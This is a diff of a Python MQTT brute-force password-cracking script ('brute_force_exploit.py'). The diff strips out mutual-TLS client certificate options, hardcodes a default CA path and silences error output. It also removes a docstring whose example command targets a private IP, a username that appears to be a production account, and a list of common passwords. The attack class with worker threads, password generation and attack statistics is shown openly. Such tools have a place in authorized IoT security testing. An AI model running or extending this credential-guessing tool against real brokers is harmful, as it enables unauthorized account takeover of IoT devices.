@@ -1,12 +1,4 @@
 #!/usr/bin/env python3
-"""
-MQTT Single User Brute-force Password Cracking (TLS Support)
-python brute_force_exploit.py --broker 10.12.112.191 --port 8883 --target-username production-sensorflame1-replayer --ca .\certs\ca-cert.pem --tls --custom-passwords "123456" "password" "admin" "1234" "0000" "1111" "8888" "12345" "12345678" "123456789"  "replayer" "sensorflamel" --delay 50 --workers 2 --min-length 7 --max-length 8
-
-============================================================
-Brute-force password cracking for individual usernames.
-"""
-
 import paho.mqtt.client as mqtt
 import time
 import threading
@@ -19,15 +11,12 @@ import json
 from datetime import datetime, timezone
 
 class SingleUserBruteForceAttack:
-    def __init__(self, broker_host="localhost", broker_port=1883, 
-                 use_tls=False, ca_certs=None, client_cert=None, 
-                 client_key=None, insecure=False):
+    def __init__(self, broker_host="localhost", broker_port=8883, 
+                 use_tls=False, ca_certs="certs/ca-cert.pem", insecure=False):
         self.broker_host = broker_host
         self.broker_port = broker_port
         self.use_tls = use_tls
         self.ca_certs = ca_certs
-        self.client_cert = client_cert
-        self.client_key = client_key
         self.insecure = insecure
         self.cracked_password = None
         self.attack_stats = {
@@ -45,12 +34,9 @@ class SingleUserBruteForceAttack:
         if self.use_tls:
             print(f"  TLS Enabled: Yes")
             if self.ca_certs:
-                print(f"  Using CA file: {self.ca_certs} -> {'FOUND' if os.path.exists(self.ca_certs) else 'MISSING'}")
+                print(f"  Using CA file (Default): {self.ca_certs} -> {'FOUND' if os.path.exists(self.ca_certs) else 'MISSING'}")
             else:
                 print("  No CA file provided; will use system CA store (if available).")
-            if self.client_cert or self.client_key:
-                print(f"  Client cert: {self.client_cert} -> {'FOUND' if (self.client_cert and os.path.exists(self.client_cert)) else 'MISSING or not provided'}")
-                print(f"  Client key : {self.client_key} -> {'FOUND' if (self.client_key and os.path.exists(self.client_key)) else 'MISSING or not provided'}")
             print(f"  Insecure mode (skip verification): {self.insecure}")
         else:
             print(f"  TLS Enabled: No")
@@ -63,15 +49,11 @@ class SingleUserBruteForceAttack:
             if self.use_tls:
                 if self.ca_certs and os.path.exists(self.ca_certs):
                     client.tls_set(ca_certs=self.ca_certs,
-                                   certfile=self.client_cert if self.client_cert and os.path.exists(self.client_cert) else None,
-                                   keyfile=self.client_key if self.client_key and os.path.exists(self.client_key) else None,
                                    cert_reqs=ssl.CERT_REQUIRED,
                                    tls_version=ssl.PROTOCOL_TLS_CLIENT,
                                    ciphers=None)
                 else:
                     ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
-                    if self.client_cert and self.client_key and os.path.exists(self.client_cert) and os.path.exists(self.client_key):
-                        ctx.load_cert_chain(certfile=self.client_cert, keyfile=self.client_key)
                     if self.insecure:
                         ctx.check_hostname = False
                         ctx.verify_mode = ssl.CERT_NONE
@@ -88,7 +70,7 @@ class SingleUserBruteForceAttack:
             
             return client
         except Exception as e:
-            print(f" Error creating client {client_id}: {e}")
+            # print(f" Error creating client {client_id}: {e}")
             return None
     
     def generate_password_list(self, username, min_length=4, max_length=8, custom_passwords=None):
@@ -250,7 +232,7 @@ class SingleUserBruteForceAttack:
                     time.sleep(delay_ms / 1000.0)
                     
             except Exception as e:
-                print(f" Error with password {password}: {e}")
+                # print(f" Error with password {password}: {e}")
                 with self.lock:
                     self.attack_stats["failed_logins"] += 1
                 continue
@@ -261,7 +243,7 @@ class SingleUserBruteForceAttack:
     def launch_attack(self, username, num_workers=1, delay_ms=100, min_password_length=4, 
                      max_password_length=6, custom_passwords=None, password_file=None):
         """Launch brute-force password cracking attack for a single username"""
-        print(f"🚀 Starting Brute-force Attack for Single User")
+        print(f"🚀 Starting Brute-force Attack (CA Hardcoded)")
         print(f"   Target: {self.broker_host}:{self.broker_port}")
         print(f"   Username: {username}")
         print(f"   Workers: {num_workers}")
@@ -330,7 +312,7 @@ class SingleUserBruteForceAttack:
             print(f"Attempts per second: {self.attack_stats['password_attempts']/duration:.1f}")
 
 def main():
-    parser = argparse.ArgumentParser(description="MQTT Single User Brute-force Password Cracking")
+    parser = argparse.ArgumentParser(description="MQTT Single User Brute-force (TLS CA Only)")
     
     parser.add_argument("--broker", required=True, help="MQTT broker host (required)")
     parser.add_argument("--target-username", required=True, help="Target username to crack (required)")
@@ -341,9 +323,8 @@ def main():
     parser.add_argument("--min-length", type=int, default=4, help="Minimum password length")
     parser.add_argument("--max-length", type=int, default=6, help="Maximum password length")
     parser.add_argument("--tls", action="store_true", help="Use TLS connection")
-    parser.add_argument("--ca", help="Path to CA certificate file (PEM) to validate broker certificate")
-    parser.add_argument("--client-cert", help="Path to client certificate (PEM) for mutual TLS")
-    parser.add_argument("--client-key", help="Path to client private key (PEM) for mutual TLS")
+    
+    parser.add_argument("--ca", default="certs/ca-cert.pem", help="Path to CA certificate file (Default: certs/ca-cert.pem)")
     parser.add_argument("--insecure", action="store_true", help="Skip TLS certificate validation (testing only)")
     parser.add_argument("--password-file", help="File containing passwords to try (one per line)")
     parser.add_argument("--custom-passwords", nargs="+", help="Custom passwords to try")
@@ -355,8 +336,6 @@ def main():
         broker_port=args.port,
         use_tls=args.tls,
         ca_certs=args.ca,
-        client_cert=args.client_cert,
-        client_key=args.client_key,
         insecure=args.insecure
     )
     
@@ -372,4 +351,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
